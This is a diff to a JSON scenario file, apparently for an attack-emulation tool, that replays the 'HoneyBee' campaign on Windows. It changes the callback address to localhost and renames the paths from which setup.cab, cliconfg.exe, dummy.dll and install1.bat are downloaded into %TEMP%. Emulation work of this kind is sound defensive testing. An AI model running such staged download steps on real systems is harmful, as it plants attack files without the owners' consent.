@@ -7,7 +7,7 @@
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": "--cp 10.0.2.22:443 --multipart 10240 --secure true",
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
                 "module": "https",
                 "type": "initialization"
             },
@@ -75,25 +75,25 @@
             "8": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
-                "request": "--src \"VFS://shared/HoneyBee/setup.cab\" --dest %TEMP%\\setup.cab",
+                "request": "--src \"VFS://shared/threats/HoneyBee/setup.cab\" --dest %TEMP%\\setup.cab",
                 "type": "message"
             },
             "9": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
-                "request": "--src \"VFS://shared/HoneyBee/cliconfg.exe\" --dest %TEMP%\\cliconfg.exe",
+                "request": "--src \"VFS://shared/threats/HoneyBee/cliconfg.exe\" --dest %TEMP%\\cliconfg.exe",
                 "type": "message"
             },
             "10": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
-                "request": "--src \"VFS://shared/HoneyBee/dummy.dll\" --dest %TEMP%\\dummy.dll",
+                "request": "--src \"VFS://shared/threats/HoneyBee/dummy.dll\" --dest %TEMP%\\dummy.dll",
                 "type": "message"
             },
             "11": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
-                "request": "--src \"VFS://shared/HoneyBee/install1.bat\" --dest %TEMP%\\install1.bat",
+                "request": "--src \"VFS://shared/threats/HoneyBee/install1.bat\" --dest %TEMP%\\install1.bat",
                 "type": "message"
             },
             "12": {
